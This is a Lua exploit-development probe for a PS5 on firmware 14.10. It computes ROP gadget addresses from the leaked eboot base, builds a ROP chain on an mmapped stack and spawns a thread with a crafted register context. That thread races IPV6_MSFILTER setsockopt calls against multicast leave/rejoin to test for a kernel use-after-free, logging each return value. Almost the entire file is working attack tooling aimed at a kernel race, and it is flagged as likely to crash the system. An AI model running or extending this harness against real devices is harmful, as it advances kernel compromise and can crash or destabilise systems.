-- CRASH_CLASS: HIGH
-- Bounded PS5 14.10 IPV6_MSFILTER / leave-rejoin return census.
-- Record every child return to distinguish ordinary ENOENT-style failures
-- from any anomalous result. Neither outcome alone establishes a kernel UAF.

print("=== PROBE 50v: MSFILTER FULL REGISTER RESTORE ===")
local function num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(p, v) memory.write_dword(p, v) end
local function wq(p, v) memory.write_qword(p, v) end
local function z(p, n) for off = 0, n - 4, 4 do wd(p + off, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function fmt(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return tostring(v)
end
local function msleep(ms)
    local ts = memory.alloc(16)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    sc(240)(uint64(ts), uint64(0))
end

local info = memory.alloc(0x200)
z(info, 0x200); wd(info, 0x160)
local ir = sc(593)(uint64(0), uint64(info))
local lo = num(memory.read_dword(info + 0x108))
local hi = num(memory.read_dword(info + 0x10c))
if num(ir) ~= 0 or lo == 0 then print("ABORT no eboot"); return end
local base = uint64(string.format("0x%X%08X", hi, lo))
local RET = base + 0x42
local POP_RAX = base + 0x992
local POP_RDI = base + 0xC9DFE
local POP_RSI = base + 0xD77D
local POP_RCX = base + 0xE64
local POP_RDX = base + 0x3B02D7
local POP_R8 = base + 0x991
local MOV_RDI_RAX = base + 0x92C67
local STUB = syscall.pipe.fn_addr

local fd = num(sc(97)(uint64(28), uint64(2), uint64(17)))
print("socket=" .. fd)
if fd < 0 or fd > 1024 then print("ABORT socket"); return end
local mreq = memory.alloc(32)
z(mreq, 32)
b(mreq, 0, 0xff); b(mreq, 1, 2); b(mreq, 15, 1)
wd(mreq + 16, 1)

local req = memory.alloc(160)
local sources = memory.alloc(128 * 128)
z(req, 160)
wd(req, 1); wd(req + 4, 1); wd(req + 8, 128)
b(req, 16, 28); b(req, 17, 28)
b(req, 24, 0xff); b(req, 25, 2); b(req, 39, 1)
wd(req + 40, 1)
wq(req + 144, sources)
for i = 1, 128 do
    local p = sources + (i - 1) * 128
    z(p, 128)
    b(p, 0, 28); b(p, 1, 28)
    b(p, 8, 0x20); b(p, 9, 1); b(p, 23, i)
end

local ITERS = 16
local PARENT_ITERS = 0
local pipebuf = memory.alloc(8); z(pipebuf, 8)
local pr = sc(135)(uint64(1), uint64(1), uint64(0), uint64(pipebuf))
local rfd = num(memory.read_dword(pipebuf))
local wfd = num(memory.read_dword(pipebuf + 4))
if num(pr) ~= 0 or rfd < 0 or wfd < 0 or rfd > 1024 or wfd > 1024 then
    print("ABORT socketpair=" .. fmt(pr)); sc(6)(uint64(fd)); return
end
local jr = sc(105)(uint64(fd), uint64(41), uint64(12), uint64(mreq), uint64(20))
if num(jr) ~= 0 then print("ABORT join=" .. fmt(jr)); return end

local stack = sc(477)(uint64(0), uint64(0x80000), uint64(3),
    uint64(0x1002), uint64(0xffffffff), uint64(0))
if fmt(stack) == "0xFFFFFFFFFFFFFFFF" then print("ABORT stack mmap"); return end
local chain = stack + 0x8000
local ready = memory.alloc(8)
local readrv = memory.alloc(8)
local progress = memory.alloc(8)
local result = memory.alloc(8)
local returns = memory.alloc(ITERS * 8)
local scratch = memory.alloc(80)
local payload = memory.alloc(80); z(payload, 80)
local tidbuf = memory.alloc(8); z(tidbuf, 8)
wq(ready, uint64(0xDEADDEAD)); wq(readrv, uint64(0xDEADDEAD))
wq(progress, uint64(0)); wq(result, uint64(0xDEADDEAD))
local off = 0
local function push(v) wq(chain + off, v); off = off + 8 end
push(POP_RAX); push(uint64(0x51515151))
push(POP_RDI); push(ready); push(MOV_RDI_RAX)
push(POP_RDI); push(uint64(rfd))
push(POP_RSI); push(scratch)
push(POP_RAX); push(uint64(3)); push(STUB) -- read gate, RDX=74
push(POP_RDI); push(readrv); push(MOV_RDI_RAX)
push(POP_RDI); push(uint64(fd))
push(POP_RSI); push(uint64(41))
for i = 1, ITERS do
    push(POP_RDI); push(uint64(fd))
    push(POP_RSI); push(uint64(41))
    push(POP_RDX); push(uint64(74))
    push(POP_RCX); push(req)
    push(POP_R8); push(uint64(152))
    push(POP_RAX); push(uint64(105)); push(STUB)
    push(POP_RDI); push(returns + (i - 1) * 8); push(MOV_RDI_RAX)
    push(POP_RDI); push(uint64(fd))
    if i % 128 == 0 and i < ITERS then
        push(POP_RAX); push(uint64(i))
        push(POP_RDI); push(progress); push(MOV_RDI_RAX)
        push(POP_RDI); push(uint64(fd))
    end
end
push(POP_RDI); push(result); push(MOV_RDI_RAX)
push(POP_RAX); push(uint64(ITERS))
push(POP_RDI); push(progress); push(MOV_RDI_RAX)
push(POP_RDI); push(uint64(0)); push(POP_RAX); push(uint64(431)); push(STUB)
print("chain_bytes=" .. off)
if off > 0x70000 then print("ABORT chain too long"); return end

local ctx = memory.alloc(0x500); z(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480)); wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0c0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3b))
wq(ctx + 0x0f8, chain); wq(ctx + 0x0e0, RET)
wq(ctx + 0x048, uint64(rfd)); wq(ctx + 0x050, scratch)
wq(ctx + 0x058, uint64(74))
wq(ctx + 0x060, req); wq(ctx + 0x098, req)
wq(ctx + 0x068, uint64(152))
local cr = sc(430)(uint64(ctx), uint64(tidbuf), uint64(0))
print("thr_create=" .. fmt(cr) .. " tid=" .. fmt(memory.read_qword(tidbuf)))
if num(cr) ~= 0 then return end
for _ = 1, 25 do
    if fmt(memory.read_qword(ready)) ~= "0x00000000DEADDEAD" then break end
    msleep(1)
end
if fmt(memory.read_qword(ready)) ~= "0x0000000051515151" then
    print("ABORT child not ready"); return
end
local wr = sc(4)(uint64(wfd), uint64(payload), uint64(74))
print("gate_write=" .. fmt(wr) .. " progress_after_release=" .. fmt(memory.read_qword(progress)))
if num(wr) ~= 74 then return end

local leaves, rejoins = 0, 0
for i = 1, PARENT_ITERS do
    local lr = sc(105)(uint64(fd), uint64(41), uint64(13), uint64(mreq), uint64(20))
    if num(lr) == 0 then leaves = leaves + 1 end
    local jr2 = sc(105)(uint64(fd), uint64(41), uint64(12), uint64(mreq), uint64(20))
    if num(jr2) == 0 then rejoins = rejoins + 1 end
    if i <= 16 or i % 512 == 0 then
        print("parent=" .. i .. " child_progress=" .. fmt(memory.read_qword(progress)) ..
            " leave=" .. fmt(lr) .. " join=" .. fmt(jr2))
    end
    if num(lr) ~= 0 or num(jr2) ~= 0 then
        print("ABORT parent operation i=" .. i)
        return
    end
end
for _ = 1, 200 do
    if num(memory.read_qword(progress)) == ITERS then break end
    msleep(1)
end
local tid = memory.read_qword(tidbuf)
local exited = false
for _ = 1, 25 do
    if num(sc(433)(tid, uint64(0))) ~= 0 then exited = true; break end
    msleep(1)
end
print("summary leaves=" .. leaves .. " rejoins=" .. rejoins ..
    " child_read=" .. fmt(memory.read_qword(readrv)) ..
    " child_progress=" .. fmt(memory.read_qword(progress)) ..
    " child_last=" .. fmt(memory.read_qword(result)) ..
    " child_exited=" .. tostring(exited))
if exited then
    local ok, fail, other, transitions = 0, 0, 0, 0
    local first_fail, last_ok, previous = 0, 0, nil
    for i = 1, ITERS do
        local value = fmt(memory.read_qword(returns + (i - 1) * 8))
        if value == "0x0000000000000000" then
            ok = ok + 1; last_ok = i
        elseif value == "0xFFFFFFFFFFFFFFFF" then
            fail = fail + 1
            if first_fail == 0 then first_fail = i end
        else
            other = other + 1
            if other <= 8 then print("unexpected_return i=" .. i .. " rv=" .. value) end
        end
        if previous ~= nil and value ~= previous then transitions = transitions + 1 end
        previous = value
    end
    print("census success=" .. ok .. " failure=" .. fail ..
        " other=" .. other .. " transitions=" .. transitions ..
        " first_failure=" .. first_fail .. " last_success=" .. last_ok)
    sc(105)(uint64(fd), uint64(41), uint64(13), uint64(mreq), uint64(20))
    sc(6)(uint64(rfd)); sc(6)(uint64(wfd)); sc(6)(uint64(fd))
end
print("canary pid=" .. tostring(sc(20)()))
print("=== PROBE 50v COMPLETE ===")
